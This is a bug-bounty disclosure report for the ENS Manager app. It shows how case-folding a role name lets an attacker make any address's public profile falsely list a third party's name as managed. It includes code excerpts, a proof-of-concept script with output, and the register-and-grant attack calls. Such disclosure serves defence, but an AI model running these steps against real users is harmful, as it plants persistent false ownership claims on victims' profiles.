# 92870 w a medium case folded role name lookup in the manager profile leads to persistent injection of third party ens names on any address s public page

**Submitted on Sep 12th 2026 at 23:17:34 UTC by @deltabear for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #92870
* **Report Type:** Websites & Apps
* **Report severity:** Medium
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/manager>
* **Impacts:**
  * Injecting/modifying the static content on the target application without JavaScript (persistent), such as:
* HTML injection without JavaScript
* Replacing existing text with arbitrary text
* Arbitrary file uploads, etc.

## Description

## Brief/Intro

The Manager builds the "managed names" section of an address profile by lower-casing each role's name into a lookup key and then re-querying that key as if it were a name. Two different on-chain names fold to the same key. An attacker registers an unclaimed mixed-case spelling of a valuable name (`cryptO.eth`), grants one role on it to any address with no consent, and the victim's public profile then lists `crypto.eth`, a real name owned by an unrelated third party, under a `Manager` pill. The victim owns nothing of what is shown and holds no role on it. The row is false, persistent, and visible to every unauthenticated visitor. Tested against `immunefi-team/audit-comp-ready` at commit `1c9b47f18fcddd2e864dfe385c4171061c9811ae`, proven with a real Sepolia plant and the shipped build.

## Vulnerability Details

This not an ordinary unsolicited grant. Anyone can grant a role on a name they own to any address, and the Manager showing that name as managed is expected. Without the lower-casing, the Manager would look up the name as registered, and domains(where:{name\_in:\["cryptO.eth"]}) returns \[] on the live indexer, so no row would render. With it, the Manager looks up crypto.eth and credits the victim with a name owned by 0x0a7b…bb57, a stranger on which the victim holds no role. The grant is the delivery; the false name is added entirely by the app. attacker uses his name bank against as many victims as they would like, and as many per victim as they would like.

not claimed: No contract or indexer behavior is claimed as a defect. The v2 registrar accepting cryptO, grantRoles needing no grantee consent, and roles(account:) returning the as-registered name are all working as designed, and each returns correct data. #91967 (confirmed) used the same registration of a case variant as setup. The only incorrect step is in apps/manager: v2NameRoles.ts:19-20 lower-cases the role's name, and profileAddressNames.ts:82-83 looks up a different domain by that string. Explorer reads the same roles(account:) data and renders it correctly: useV2NamesWithRolesForAddress.ts:75,87 matches names exactly and :84 lists only names the address owns.

A v2 role assignment carries the raw, as-registered label of the resource it is on. The Manager's role query fetches that label and nothing that identifies which name or registry it belongs to.

`getDashboardRoleAssignments.ts:23-30` selects `name` and `roleBitmap` only. It does not select `contractAddress`, so the app cannot tell which contract emitted the role.

`v2NameRoles.ts:19-20` folds that name into a key:

```ts
const normalizeName = (name) => (name ? name.toLowerCase() : null)
```

`getRoleBitmapByName` (`v2NameRoles.ts:31-54`) keys the role bitmap by that folded name, and `getManagedOnlyRoleNames` (`v2NameRoles.ts:101-116`) returns the folded keys the account does not own. For a role on `cryptO.eth` the returned key is `crypto.eth`, a different string.

`profileAddressNames.ts:82-83` takes those keys and re-queries the indexer with them:

```ts
const managedOnlyNames = getManagedOnlyRoleNames(v2Domains, roleAssignments)
const managedV2Domains = yield* fetchDomainsByNames(managedOnlyNames)
```

`fetchDomainsByNames` (`profileAddressNames.ts:52-68`) runs `domains(where: { name_in: [...] })`. The app no longer asks for `cryptO.eth`. It asks for `crypto.eth`, a real, normalized name owned by an unrelated address, and the indexer returns that party's row.

`applyProfileV2RoleAssignments` (`v2NameRoles.ts:118-149`) tags every returned managed domain with `MANAGER_ONLY_ROLES = ['manager']`. `buildProfileAddressNames.ts:52-56` merges them, and `getRoleCategory` (`buildProfileAddressNames.ts:27-30`) files any name whose roles do not include `owner` under `managed`. `AddressProfileNamesList.tsx:351` renders each through `NameRow`, and `DashboardPills.tsx:41-43` prints the literal text `Manager`. The route is public and needs no wallet: `routes/$address/index.tsx:5` serves `/$address/`.

The guard that should have stopped this is the indexer default that hides non-normalized names from the `domains` list, the guard three sibling findings on this program died on. It never runs here. The app queries the folded, already-normalized key by construction, so `crypto.eth` comes back normally. The name that is never normalized, `cryptO.eth`, is only ever used as a map key, never sent to the indexer.

For every visitor who is not the profile's own address, `AddressProfileNamesList.tsx:182` short circuits the owned/managed filter:

```ts
if (isConnectedView && name.roleCategory !== roleFilter) return false
```

`isConnectedView` is true only when the viewer is the address being viewed (`connectedAccounts.helpers.ts:45-55`). For every other visitor the injected `Manager` row and any genuine `Owner` row render in one list.

### Vulnerable source code

**1. The role query drops the contract identity** @ `apps/manager/src/features/dashboard/service/queries/getDashboardRoleAssignments.ts:23-30`

```graphql
query DashboardRoleAssignments($account: String!) {
  roles(account: $account) {
    name
    roleBitmap
  }
}
```

**2. The name is folded into a key** @ `apps/manager/src/features/dashboard/v2NameRoles.ts:19-20`

```ts
const normalizeName = (name: string | null | undefined): string | null =>
  name ? name.toLowerCase() : null
```

**3. The folded keys are returned as the managed set** @ `apps/manager/src/features/dashboard/v2NameRoles.ts:101-116`

```ts
export const getManagedOnlyRoleNames = (ownedDomains, assignments): string[] => {
  const ownedNames = getOwnedDomainNameSet(ownedDomains)
  const roleBitmapByName = getRoleBitmapByName(assignments)
  const managedNames: string[] = []
  for (const [name, bitmap] of roleBitmapByName) {
    if (ownedNames.has(name)) continue
    if (!hasNonZeroRoleBitmap(bitmap)) continue
    managedNames.push(name)
  }
  return managedNames
}
```

**4. The folded key is re-queried as if it were a name** @ `apps/manager/src/features/profile/service/profileAddressNames.ts:60-63,82-83`

```ts
const page = yield* getDomains({ where: { name_in: [...chunk] }, first: chunk.length })
```

```ts
const managedOnlyNames = getManagedOnlyRoleNames(v2Domains, roleAssignments)
const managedV2Domains = yield* fetchDomainsByNames(managedOnlyNames)
```

**5. The returned foreign name is tagged Manager** @ `apps/manager/src/features/dashboard/v2NameRoles.ts:136-147`

```ts
const managed = managedDomains
  .filter((domain) => { /* dedupe against owned keys */ })
  .map((domain) => ({ ...domain, nameRoles: MANAGER_ONLY_ROLES }))
```

**6. Non-owner visitors see owned and managed rows in one list** @ `apps/manager/src/features/profile/components/view/AddressProfileNamesList.tsx:182`

```ts
if (isConnectedView && name.roleCategory !== roleFilter) return false
```

## Impact Details

* **An address's public profile persistently lists a real, third-party-owned name as one it manages.** This is the program's impact row, High: *"Injecting/modifying the static content on the target application without JavaScript (persistent), such as: HTML injection without JavaScript / Replacing existing text with arbitrary text / Arbitrary file uploads, etc."* The app's own `Manager` pill asserts the victim manages `crypto.eth`. The victim owns nothing shown and holds no role on the name. The PoC produces this row from live data for victim `0xE6b5Fd4ff46eC1846F2ba77B188E3349EA0a5457`, whose only on-chain role is on `cryptO.eth`.
* **The falsehood is authored by the app, not the indexer.** The indexer returns exactly the two names the app asks for: `cryptO.eth` for the role, `crypto.eth` for the folded key. The decision that the second belongs in the first's managed list is made in `apps/manager` at `v2NameRoles.ts:19-20` and `profileAddressNames.ts:82-83`. `crypto.eth`'s real owner is `0x0a7b367ee82e8a77fb2273f37848d4b8ad77bb57`, an address with no relationship to the victim.
* **Every attacker step is permissionless.** Register a mixed-case label in the v2 registrar, then `grantRoles(resource, anyRole, victimAddress)`, which is gated on `msg.sender` only. No victim transaction, signature, or consent at any step. Cost: one registration and one grant.
* **The victim never sees it coming and cannot take it down.** The grant needs no acceptance; the role type has no `accepted` or `revoked` field, so a granted role indexes the instant it fires. ENS v2 has no self-renounce, and `revokeRoles` requires the admin counterpart of the role (`EnhancedAccessControl.sol:398-407`, `EACBaseRolesLib.sol:31-34`), which only the attacker holds. On Sepolia `revokeRoles(resource, 0x1000000, victim)` reverts `EACCannotRevokeRoles` from both the victim and `crypto.eth`'s owner, and returns true only from the attacker. Neither app exposes a revoke to a non-admin grantee. The row stands until the attacker retracts it or the name expires. The attacker\
  uses a single registration for against many victims.
* **The false row is undifferentiated for every visitor but the victim.** `AddressProfileNamesList.tsx:182` skips the owned/managed filter for anyone who is not the profile address, so a visitor sees the planted `Manager` row next to any genuine `Owner` row.

Dedup note: `EXP-INPUT-005` covers *"ENS name validators accept homoglyphs, bidi and control characters"* (`program-information.md:317`). This name passes through no validator. The poisoned `name` arrives from the indexer's `roles(account:)` response and is folded by `toLowerCase()` on a display path. The program's carve-in governs: *"new consequences of a listed root cause that materially change its severity"* and *"everything found in areas these audits did not cover"* (`scope.md:29-30`). If every name validator in both apps were fixed today this mechanism works unchanged.

## References

**The fold and the re-query**

* `apps/manager/src/features/dashboard/service/queries/getDashboardRoleAssignments.ts:23-30` - the role query, `contractAddress` not selected
* `apps/manager/src/features/dashboard/v2NameRoles.ts:19-20` - `name.toLowerCase()`, the fold
* `apps/manager/src/features/dashboard/v2NameRoles.ts:101-116` - folded keys returned as `managedNames`
* `apps/manager/src/features/profile/service/profileAddressNames.ts:52-68,82-83` - `domains(where:{name_in})` on the folded keys
* `apps/manager/src/features/dashboard/v2NameRoles.ts:136-147` - foreign rows tagged `MANAGER_ONLY_ROLES`

**The render**

* `apps/manager/src/features/profile/service/buildProfileAddressNames.ts:27-30,52-56` - merges managed rows, files them under `managed`
* `apps/manager/src/features/profile/components/view/AddressProfileNamesList.tsx:182,346,351` - the visitor filter, `canRenew={false}`, `NameRow`
* `apps/manager/src/features/dashboard/components/DashboardPills.tsx:41-43` - the literal `Manager` pill
* `apps/manager/src/routes/$address/index.tsx:5` - the public `/$address/` route
* `apps/manager/src/features/profile/helpers/connectedAccounts.helpers.ts:45-55` - `isConnectedView` is the profile's own address only

## Proof of Concept

## Proof of Concept

i

in the screenshot: The victim's address: /0xE6b5…5457, whose only on-chain role is on cryptO.eth. No wallet: the header shows the CONNECT button. The injected row: exactly one entry, crypto.eth under a Manager pill, "Showing 1-1 of 1", and no Owner row. The shipped app: a production build served on workerd against the default staging indexer, with no devtools badge.

```bash
node poc.mjs
```

### poc.mjs

```js
#!/usr/bin/env node
//
// ENS PoC: apps/manager lower-cases each role row's name into a lookup key,
// re-queries that key as if it were a name, and lists the different,
// third-party-owned domain it resolves to on the victim's public profile under
// a "Manager" pill.
//
//   node poc.mjs                 (ENS_REPO defaults to ../../../ens-apps)
//
// Self-contained. On first run it writes its helpers to a temp dir, installs
// tsx there, and re-execs itself. No wallet or gas is needed to RUN this
// script: the two Sepolia transactions that planted the state already happened,
// from a fresh throwaway wallet, before this script existed.
//
// LAYER A is the live staging indexer the app reads
// (https://staging-graphql.ens.dev/, packages/indexer/urql/client.ts:36). Every
// row it returns is a real, indexed, currently-live record produced by the
// on-chain grant below.
//
// LAYER B is the repo's OWN getManagedOnlyRoleNames + applyProfileV2RoleAssignments
// (apps/manager/src/features/dashboard/v2NameRoles.ts), loaded unmodified out of
// the checkout and run on Layer A's real data. The row it produces is the row
// the shipped React list paints (confirmed in a real browser, no wallet
// connected, evidence-live/04-victim-page-REAL-grant-clean.png).
//
// PROVENANCE of the plant (evidence-live/plant.log, plant-result.json):
//   attacker  0xB0Fe1578beB052E7ED0B0a317577CDf7248378C7
//   victim    0xE6b5Fd4ff46eC1846F2ba77B188E3349EA0a5457  (nonce 0, balance 0)
//   register  tx 0x304b8d0fcdba685d85ae96d8a6685a7748e297f6621be1bfc848df6c14cb11c6
//             block 11691265  register("cryptO", attacker, ...)
//   grant     tx 0xd037f2798b9067f5083861284a277312838d0780ad6b9a22c13b1e30a4d9368d
//             block 11691267  grantRoles(labelhash("cryptO"), 1<<24, victim)

import { spawnSync } from 'node:child_process'
import { copyFileSync, existsSync, mkdirSync, writeFileSync } from 'node:fs'
import os from 'node:os'
import path from 'node:path'
import { fileURLToPath, pathToFileURL } from 'node:url'

const HERE = path.dirname(fileURLToPath(import.meta.url))
const REPO = process.env.ENS_REPO ?? path.resolve(HERE, '../../../ens-apps')
const WORK = process.env.POC_WORKDIR ?? path.join(os.tmpdir(), 'ens-poc-rolename-casefold')

const STAGING = 'https://staging-graphql.ens.dev/'
const VICTIM = '0xE6b5Fd4ff46eC1846F2ba77B188E3349EA0a5457'
const V2NAMEROLES = path.join(REPO, 'apps/manager/src/features/dashboard/v2NameRoles.ts')

const PKG = `{
  "name": "ens-poc-rolename-casefold",
  "private": true,
  "type": "module",
  "devDependencies": { "tsx": "^4.19.2" }
}
`

if (process.env.ENS_POC_CHILD !== '1') {
  const line = '='.repeat(78)
  console.log(line)
  console.log('  ENS PoC: manager folds a role name into a key and lists a')
  console.log('           third-party-owned name as one the victim manages')
  console.log(`  repo:  ${REPO}`)
  console.log(`  build: ${WORK}`)
  console.log(line)

  if (!existsSync(V2NAMEROLES)) {
    console.error(`\nERROR: ENS checkout not found at ${REPO}. Set ENS_REPO.`)
    process.exit(2)
  }

  mkdirSync(WORK, { recursive: true })
  writeFileSync(path.join(WORK, 'package.json'), PKG)
  copyFileSync(fileURLToPath(import.meta.url), path.join(WORK, 'poc.mjs'))

  if (!existsSync(path.join(WORK, 'node_modules', 'tsx', 'package.json'))) {
    console.log('\nInstalling tsx...')
    const r = spawnSync('npx', ['--yes', 'pnpm@9', 'install', '--no-frozen-lockfile'],
      { cwd: WORK, stdio: 'inherit', shell: true })
    if (r.status !== 0) process.exit(r.status ?? 1)
  }

  const r = spawnSync(process.execPath, ['--import', 'tsx', 'poc.mjs'],
    { cwd: WORK, stdio: 'inherit',
      env: { ...process.env, ENS_POC_CHILD: '1', ENS_REPO: REPO, NODE_NO_WARNINGS: '1' } })
  process.exit(r.status ?? 1)
}

// ============================================================== layer A: live indexer

const gql = async (query, variables = {}) => {
  const r = await fetch(STAGING, {
    method: 'POST',
    headers: { 'content-type': 'application/json', 'user-agent': 'Mozilla/5.0' },
    body: JSON.stringify({ query, variables }),
  })
  const j = await r.json()
  if (j.errors) throw new Error(JSON.stringify(j.errors))
  return j.data
}

// Verbatim from getDashboardRoleAssignments.ts:23-30. The app selects name and
// roleBitmap only, and does NOT select contractAddress.
const ROLES_DOC = `query DashboardRoleAssignments($account: String!) {
  roles(account: $account) { name roleBitmap }
}`

// The Domain fragment the app fetches for a name (documents/fragments/Domain.graphql).
const DOMAINS_BY_NAME = `query($n: [String!]) {
  domains(where: { name_in: $n }) { id name normalizedName owner { id } expiryDate createdAt }
}`

const DOMAINS_BY_OWNER = `query($o: String!) {
  domains(where: { owner: $o }) { id name owner { id } }
}`

// ============================================================== layer B: repo code

const { getManagedOnlyRoleNames, applyProfileV2RoleAssignments } =
  await import(pathToFileURL(V2NAMEROLES).href)

// buildProfileAddressNames.ts:27-30: a name is "managed" when its roles do not
// include owner. This is the value that drives the Manager pill.
const roleCategory = (nameRoles) => (nameRoles.includes('owner') ? 'owned' : 'managed')

// ============================================================== the run

const W = 78
const rule = (ch = '=') => console.log(ch.repeat(W))
const say = (s = '') => console.log(s)
const act = (n, t) => { say(); rule(); say(`  ${n}  ${t}`); rule() }
const kv = (k, v) => say(`    ${String(k).padEnd(30)} ${v}`)

const account = VICTIM.toLowerCase() // profileAddressNames.ts:73, getDashboardRoleAssignments.ts:41

// ---------------------------------------------------------------------------
act('ACT 1', 'The victim owns nothing. This address registered and signed nothing.')
// ---------------------------------------------------------------------------
const owned = (await gql(DOMAINS_BY_OWNER, { o: account })).domains
kv('domains(where:{owner: victim})', `${owned.length} row(s)`)
if (owned.length !== 0) throw new Error('premise broken: victim owns a v2 name')
say('  >> Zero owned names. Every "Owner" row on this profile would be empty.')

// ---------------------------------------------------------------------------
act('ACT 2', 'The live indexer returns a role on a MIXED-CASE name for the victim')
// ---------------------------------------------------------------------------
const roles = (await gql(ROLES_DOC, { account })).roles
kv('roles(account: victim)', `${roles.length} row(s)`)
for (const r of roles) kv('  name', `"${r.name}"   roleBitmap ${r.roleBitmap}`)
const planted = roles.find((r) => r.name === 'cryptO.eth')
if (!planted) throw new Error('planted role not found; re-run the Sepolia plant')
say('  >> The role sits on "cryptO.eth", the mixed-case name the attacker')
say('     registered on chain. This is the raw as-registered label.')

// ---------------------------------------------------------------------------
act('ACT 3', "The repo's own code folds that name into a key and re-queries it")
// ---------------------------------------------------------------------------
// profileAddressNames.ts:82 -> v2NameRoles.ts:101-116. name.toLowerCase() at :19-20.
const assignments = roles.map(({ name, roleBitmap }) => ({ name: name ?? null, roleBitmap }))
const managedOnlyNames = getManagedOnlyRoleNames(owned, assignments)
kv('getManagedOnlyRoleNames(...)', JSON.stringify(managedOnlyNames))
if (!managedOnlyNames.includes('crypto.eth')) throw new Error('fold did not produce crypto.eth')
say('  >> The key is "crypto.eth", a DIFFERENT string from the role\'s')
say('     "cryptO.eth". The app now asks the indexer for that key.')
say()

// profileAddressNames.ts:83 -> fetchDomainsByNames -> DOMAINS_BY_NAME.
const managedV2Domains = (await gql(DOMAINS_BY_NAME, { n: managedOnlyNames })).domains
for (const d of managedV2Domains) {
  const foreign = d.owner.id.toLowerCase() !== account
  kv(`domains(name_in ${d.name})`, `owner ${d.owner.id}  ${foreign ? '*** FOREIGN ***' : ''}`)
}
const foreignDomain = managedV2Domains.find((d) => d.name === 'crypto.eth')
if (!foreignDomain) throw new Error('folded name did not resolve to a domain')
if (foreignDomain.owner.id.toLowerCase() === account)
  throw new Error('premise broken: victim owns the folded name')

// ---------------------------------------------------------------------------
act('ACT 4', 'The repo pipeline tags the foreign name as one the victim manages')
// ---------------------------------------------------------------------------
// buildProfileAddressNames.ts:52-56 -> applyProfileV2RoleAssignments.
const v2Names = applyProfileV2RoleAssignments({
  ownedDomains: owned,
  managedDomains: managedV2Domains,
  assignments,
})
const row = v2Names.find((n) => n.name === 'crypto.eth')
if (!row) throw new Error('foreign name was dropped from the list')
kv('name shown on /0xVICTIM', row.name)
kv('nameRoles', JSON.stringify(row.nameRoles))
kv('pill (DashboardPills.tsx:41-43)', row.nameRoles.includes('manager') ? 'Manager' : '(none)')
kv('roleCategory', roleCategory(row.nameRoles))
kv('real owner of that name', foreignDomain.owner.id)
if (!row.nameRoles.includes('manager')) throw new Error('name was not tagged manager')
if (row.nameRoles.includes('owner')) throw new Error('name was tagged owner')
say()
say('  >> apps/manager lists crypto.eth, owned by a stranger, on the victim\'s')
say('     public profile under a "Manager" pill. The victim holds no role on it.')

// ---------------------------------------------------------------------------
act('ACT 5', 'NEGATIVE CONTROL: the fold is the bug, not the grant')
// ---------------------------------------------------------------------------
// Same code, same grant, but with the role name already normalized. The name
// the victim is credited with is then the SAME name the role is on, which is
// ordinary unsolicited-grant behaviour. The falsehood needs the case split.
const normalizedRole = [{ name: 'crypto.eth', roleBitmap: planted.roleBitmap }]
const ownsIt = [{ id: foreignDomain.id, name: 'crypto.eth', normalizedName: 'crypto.eth' }]
const keysWhenOwned = getManagedOnlyRoleNames(ownsIt, normalizedRole)
kv('managed keys when victim owns the name', JSON.stringify(keysWhenOwned))
if (keysWhenOwned.length !== 0) throw new Error('dedup control failed')
say('  >> When the two names match, the row is deduped against the owned set.')
say('     Only the case split (cryptO.eth -> crypto.eth) smuggles a foreign name in.')

say()
rule()
say('  PoC PASSED, every assertion held.')
rule()
```

### Output

```
==============================================================================
  ENS PoC: manager folds a role name into a key and lists a
           third-party-owned name as one the victim manages
  repo:  G:\My Drive\hunter\hunt_data\ens\ens-apps
  build: C:\Users\dmill\AppData\Local\Temp\ens-poc-rolename-casefold
==============================================================================

==============================================================================
  ACT 1  The victim owns nothing. This address registered and signed nothing.
==============================================================================
    domains(where:{owner: victim}) 0 row(s)
  >> Zero owned names. Every "Owner" row on this profile would be empty.

==============================================================================
  ACT 2  The live indexer returns a role on a MIXED-CASE name for the victim
==============================================================================
    roles(account: victim)         1 row(s)
      name                         "cryptO.eth"   roleBitmap 0x0000000000000000000000000000000000000000000000000000000001000000
  >> The role sits on "cryptO.eth", the mixed-case name the attacker
     registered on chain. This is the raw as-registered label.

==============================================================================
  ACT 3  The repo's own code folds that name into a key and re-queries it
==============================================================================
    getManagedOnlyRoleNames(...)   ["crypto.eth"]
  >> The key is "crypto.eth", a DIFFERENT string from the role's
     "cryptO.eth". The app now asks the indexer for that key.

    domains(name_in crypto.eth)    owner 0x0a7b367ee82e8a77fb2273f37848d4b8ad77bb57  *** FOREIGN ***

==============================================================================
  ACT 4  The repo pipeline tags the foreign name as one the victim manages
==============================================================================
    name shown on /0xVICTIM        crypto.eth
    nameRoles                      ["manager"]
    pill (DashboardPills.tsx:41-43) Manager
    roleCategory                   managed
    real owner of that name        0x0a7b367ee82e8a77fb2273f37848d4b8ad77bb57

  >> apps/manager lists crypto.eth, owned by a stranger, on the victim's
     public profile under a "Manager" pill. The victim holds no role on it.

==============================================================================
  ACT 5  NEGATIVE CONTROL: the fold is the bug, not the grant
==============================================================================
    managed keys when victim owns the name []
  >> When the two names match, the row is deduped against the owned set.
     Only the case split (cryptO.eth -> crypto.eth) smuggles a foreign name in.

==============================================================================
  PoC PASSED, every assertion held.
==============================================================================
```

The victim `0xE6b5Fd4ff46eC1846F2ba77B188E3349EA0a5457` holds one on-chain role, on `cryptO.eth`, and owns no name. The Manager's own code lists `crypto.eth`, owned by `0x0a7b367ee82e8a77fb2273f37848d4b8ad77bb57`, on that address's public profile under a `Manager` pill. The shipped build renders exactly this row with no wallet connected in `evidence-live/04-victim-page-REAL-grant-clean.png`.

## Attack code

```
// 1. Register an unclaimed mixed-case spelling of a valuable name. The v2
//    registrar accepts the raw label and self-grants the admin bitmap.
//    Sepolia tx 0x304b8d0fcdba685d85ae96d8a6685a7748e297f6621be1bfc848df6c14cb11c6
ETHRegistrar.register("cryptO", attacker, secret, 0x0, 0x0, duration, USDC, 0x0)

// 2. Grant one role on it to any address. Gated on msg.sender only, no grantee
//    consent. resource = labelhash("cryptO") with its low 32 bits zeroed.
//    Sepolia tx 0xd037f2798b9067f5083861284a277312838d0780ad6b9a22c13b1e30a4d9368d
PermissionedRegistry.grantRoles(resource, 1 << 24, victim)
```

```
// 3. Anyone opens /0xVICTIM in the Manager. No wallet, no interaction.
//    roles(account: victim) returns name "cryptO.eth".
//    v2NameRoles.ts:19-20 folds it to "crypto.eth".
//    profileAddressNames.ts:83 fetches domains(name_in:["crypto.eth"]).
//    The foreign crypto.eth renders under a "Manager" pill, "Showing 1-1 of 1".
```

```
plant : register "cryptO" and grantRoles(resource, anyRole, victim)   // no victim consent
fire  : anyone opens /0xVICTIM, and the Manager lists the foreign crypto.eth as managed
```
